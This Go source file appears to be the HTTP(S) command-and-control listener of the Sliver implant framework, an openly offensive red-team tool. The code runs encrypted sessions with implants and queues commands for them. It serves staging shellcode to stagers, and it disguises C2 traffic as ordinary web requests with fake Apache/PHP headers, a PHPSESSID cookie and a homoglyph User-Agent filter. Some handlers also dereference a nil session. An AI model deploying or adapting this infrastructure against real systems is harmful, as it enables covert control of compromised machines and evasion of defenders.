package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"io/ioutil"
	"net/http"
	"path/filepath"
	"strings"
	"sync"
	"time"

	consts "github.com/bishopfox/sliver/client/constants"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/website"

	"github.com/golang/protobuf/proto"
	"github.com/gorilla/mux"
)

var (
	httpLog   = log.NamedLogger("c2", "http")
	accessLog = log.NamedLogger("c2", "http-access")
)

const (
	defaultHTTPTimeout = time.Second * 60
	pollTimeout        = defaultHTTPTimeout - 5
	sessionCookieName  = "PHPSESSID"

	staticWebDirName = "www"
)

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID      string
	Sliver  *core.Sliver
	Key     cryptography.AESKey
	Started time.Time
	replay  map[string]bool // Sessions are mutex'd
}

// Keeps a hash of each msg in a session to detect replay'd messages
func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
	if len(ciphertext) < 1 {
		return false
	}
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay[digest]; ok {
		return true
	}
	s.replay[digest] = true
	return false
}

type httpSessions struct {
	sessions *map[string]*HTTPSession
	mutex    *sync.RWMutex
}

func (s *httpSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.sessions)[session.ID] = session
}

func (s *httpSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return (*s.sessions)[sessionID]
}

func (s *httpSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete((*s.sessions), sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// HTTPServerConfig - Config data for servers
type HTTPServerConfig struct {
	Addr    string
	LPort   uint16
	Domain  string
	Website string
	Secure  bool
	Cert    []byte
	Key     []byte
	ACME    bool
}

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer      *http.Server
	Conf            *HTTPServerConfig
	Sessions        *httpSessions
	SliverShellcode []byte // Sliver shellcode to serve during staging process
	Cleanup         func()
}

// StartHTTPSListener - Start an HTTP(S) listener, this can be used to start both
//						HTTP/HTTPS depending on the caller's conf
func StartHTTPSListener(conf *HTTPServerConfig) *SliverHTTPC2 {
	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		Conf: conf,
		Sessions: &httpSessions{
			sessions: &map[string]*HTTPSession{},
			mutex:    &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: defaultHTTPTimeout,
		ReadTimeout:  defaultHTTPTimeout,
		IdleTimeout:  defaultHTTPTimeout,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}
	if conf.ACME {
		conf.Domain = filepath.Base(conf.Domain) // I don't think we need this, but we do it anyways
		httpLog.Infof("Attempting to fetch let's encrypt certificate for '%s' ...", conf.Domain)
		acmeManager := certs.GetACMEManager(conf.Domain)
		acmeHTTPServer := &http.Server{Addr: ":80", Handler: acmeManager.HTTPHandler(nil)}
		go acmeHTTPServer.ListenAndServe()
		server.HTTPServer.TLSConfig = &tls.Config{
			GetCertificate: acmeManager.GetCertificate,
		}
		server.Cleanup = func() {
			ctx, cancelHTTP := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTP()
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown http acme server")
			}
			ctx, cancelHTTPS := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTPS()
			server.HTTPServer.Shutdown(ctx)
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown https server")
			}
		}
	} else {
		server.HTTPServer.TLSConfig = getHTTPTLSConfig(conf)
		server.Cleanup = func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			server.HTTPServer.Shutdown(ctx)
			if err := server.HTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown https server")
			}
		}
	}
	_, _, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, conf.Domain)
	if err == certs.ErrCertDoesNotExist {
		_, _, err := certs.ServerGenerateRSACertificate(conf.Domain)
		if err != nil {
			httpLog.Errorf("Failed to generate server rsa certificate %s", err)
			return nil
		}
	}
	return server
}

func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
	if conf.Cert == nil || conf.Key == nil {
		var err error
		conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate(conf.Domain)
		if err != nil {
			httpLog.Warnf("Failed to generate self-signed tls cert/key pair %v", err)
			return nil
		}
	}
	cert, err := tls.X509KeyPair(conf.Cert, conf.Key)
	if err != nil {
		httpLog.Warnf("Failed to parse tls cert/key pair %v", err)
		return nil
	}
	return &tls.Config{
		Certificates:             []tls.Certificate{cert},
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()

	// Procedural C2
	// ===============
	// .txt = rsakey
	// .css = start
	// .php = session
	//  .js = poll
	// .png = stop
	// .ico = sliver shellcode

	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:.*\\.css$}", s.startSessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
	// Can't force the user agent on the stager payload
	// Request from msf stager payload will look like:
	// GET /login.do/B64_ENCODED_PAYLOAD_UUID
	router.HandleFunc("/{rpath:.*\\.do/.*$}", s.eggHandler).Methods(http.MethodGet)

	// Request does not match the C2 profile so we pass it to the static content or 404 handler
	if s.Conf.Website != "" {
		httpLog.Infof("Serving static content from website %v", s.Conf.Website)
		router.HandleFunc("/{rpath:.*}", s.websiteContentHandler).Methods(http.MethodGet)
	} else {
		// 404 Handler - Just 404 on every path that doesn't match another handler
		httpLog.Infof("No website content, using wildcard 404 handler")
		router.HandleFunc("/{rpath:.*}", default404Handler).Methods(http.MethodGet, http.MethodPost)
	}

	router.Use(loggingMiddleware)
	router.Use(defaultRespHeaders)

	return router
}

// This filters requests that do not have the correct "User-agent" header
func filterAgent(req *http.Request, rm *mux.RouteMatch) bool {
	userAgent := req.Header["User-Agent"]
	if 0 < len(userAgent) && strings.HasPrefix(userAgent[0], "Mozillа") {
		return true
	}
	return false
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		accessLog.Infof("%s - %s - %v", req.RemoteAddr, req.RequestURI, req.Header["User-Agent"])
		next.ServeHTTP(resp, req)
	})
}

func defaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		resp.Header().Set("Server", "Apache/2.4.9 (Unix)")
		resp.Header().Set("X-Powered-By", "PHP/5.1.2-1+b1")
		resp.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")

		switch uri := req.URL.Path; {
		case strings.HasSuffix(uri, ".txt"):
			resp.Header().Set("Content-type", "text/plain; charset=utf-8")
		case strings.HasSuffix(uri, ".css"):
			resp.Header().Set("Content-type", "text/css; charset=utf-8")
		case strings.HasSuffix(uri, ".php"):
			resp.Header().Set("Content-type", "text/html; charset=utf-8")
		case strings.HasSuffix(uri, ".js"):
			resp.Header().Set("Content-type", "text/javascript; charset=utf-8")
		case strings.HasSuffix(uri, ".png"):
			resp.Header().Set("Content-type", "image/png")
		default:
			resp.Header().Set("Content-type", "application/octet-stream")
		}

		next.ServeHTTP(resp, req)
	})
}

func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Infof("Request for site %v -> %s", s.Conf.Website, req.RequestURI)
	contentType, content, err := website.GetContent(s.Conf.Website, req.RequestURI)
	if err != nil {
		httpLog.Infof("No website content for %s", req.RequestURI)
		resp.WriteHeader(404) // No content for this path
		return
	}
	resp.Header().Set("Content-type", contentType)
	resp.Write(content)
}

func default404Handler(resp http.ResponseWriter, req *http.Request) {
	resp.WriteHeader(404)
}

// [ HTTP Handlers ] ---------------------------------------------------------------

func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
	certPEM, _, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, s.Conf.Domain)
	if err != nil {
		httpLog.Infof("Failed to get server certificate for cn = '%s': %s", s.Conf.Domain, err)
	}
	resp.Write(certPEM)
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {

	// Note: these are the c2 certificates NOT the certificates/keys used for SSL/TLS
	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, s.Conf.Domain)
	if err != nil {
		httpLog.Info("Failed to fetch rsa private key")
		resp.WriteHeader(404)
		return
	}

	// RSA decrypt request body
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	httpLog.Debugf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
	buf, _ := ioutil.ReadAll(req.Body)
	sessionInitData, err := cryptography.RSADecrypt(buf, privateKey)
	if err != nil {
		httpLog.Info("RSA decryption failed")
		resp.WriteHeader(404)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	session := newSession()
	session.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
	checkin := time.Now()
	session.Sliver = &core.Sliver{
		ID:            core.GetHiveID(),
		Transport:     "http(s)",
		RemoteAddress: req.RemoteAddr,
		Send:          make(chan *sliverpb.Envelope, 16),
		RespMutex:     &sync.RWMutex{},
		Resp:          map[uint64]chan *sliverpb.Envelope{},
		LastCheckin:   &checkin,
	}
	core.Hive.AddSliver(session.Sliver)
	s.Sessions.Add(session)
	httpLog.Infof("Started new session with id %s", session.ID)

	data, err := cryptography.GCMEncrypt(session.Key, []byte(session.ID))
	if err != nil {
		httpLog.Info("Failed to encrypt session identifier")
		resp.WriteHeader(404)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.Conf.Domain,
		Name:     sessionCookieName,
		Value:    session.ID,
		Secure:   true,
		HttpOnly: true,
	})
	resp.Write(data)
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {

	session := s.getSession(req)
	if session == nil {
		httpLog.Infof("No session with id %#v", session.ID)
		resp.WriteHeader(403)
		return
	}

	data, _ := ioutil.ReadAll(req.Body)
	if session.isReplayAttack(data) {
		httpLog.Warn("Replay attack detected")
		resp.WriteHeader(404)
		return
	}
	body, err := cryptography.GCMDecrypt(session.Key, data)
	if err != nil {
		httpLog.Warnf("GCM decryption failed %v", err)
		resp.WriteHeader(404)
		return
	}
	envelope := &sliverpb.Envelope{}
	proto.Unmarshal(body, envelope)

	handlers := sliverHandlers.GetSliverHandlers()
	if envelope.ID != 0 {
		session.Sliver.RespMutex.RLock()
		defer session.Sliver.RespMutex.RUnlock()
		if resp, ok := session.Sliver.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		handler.(func(*core.Sliver, []byte))(session.Sliver, envelope.Data)
	}
	resp.WriteHeader(200)
	// TODO: Return random data?
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	session := s.getSession(req)
	if session == nil {
		httpLog.Infof("No session with id %#v", session.ID)
		resp.WriteHeader(403)
		return
	}

	select {
	case envelope := <-session.Sliver.Send:
		resp.WriteHeader(200)
		envelopeData, _ := proto.Marshal(envelope)
		data, _ := cryptography.GCMEncrypt(session.Key, envelopeData)
		resp.Write(data)
	case <-time.After(pollTimeout):
		httpLog.Info("Poll time out")
		resp.WriteHeader(201)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
	session := s.getSession(req)
	if session == nil {
		httpLog.Infof("No session with id %#v", session.ID)
		resp.WriteHeader(403)
		return
	}

	nonce := []byte(req.URL.Query().Get("nonce"))
	if session.isReplayAttack(nonce) {
		httpLog.Warn("Replay attack detected")
		resp.WriteHeader(404)
		return
	}
	_, err := cryptography.GCMDecrypt(session.Key, nonce)
	if err != nil {
		httpLog.Warnf("GCM decryption failed %v", err)
		resp.WriteHeader(404)
		return
	}

	core.Hive.RemoveSliver(session.Sliver)
	core.EventBroker.Publish(core.Event{
		EventType: consts.DisconnectedEvent,
		Sliver:    session.Sliver,
	})
	s.Sessions.Remove(session.ID)

	resp.WriteHeader(200)
}

// eggHandler - Serves the sliver shellcode to the egg requesting it
func (s *SliverHTTPC2) eggHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Infof("Received egg request from %s", req.RemoteAddr)
	resp.Write(s.SliverShellcode)
	httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverShellcode), req.RemoteAddr)
	resp.WriteHeader(200)
}

func (s *SliverHTTPC2) getSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		if cookie.Name == sessionCookieName {
			session := s.Sessions.Get(cookie.Value)
			if session != nil {
				checkin := time.Now()
				session.Sliver.LastCheckin = &checkin
				return session
			}
			return nil
		}
	}
	return nil // No valid cookie names
}

func newSession() *HTTPSession {
	return &HTTPSession{
		ID:      newHTTPSessionID(),
		Started: time.Now(),
		replay:  map[string]bool{},
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}
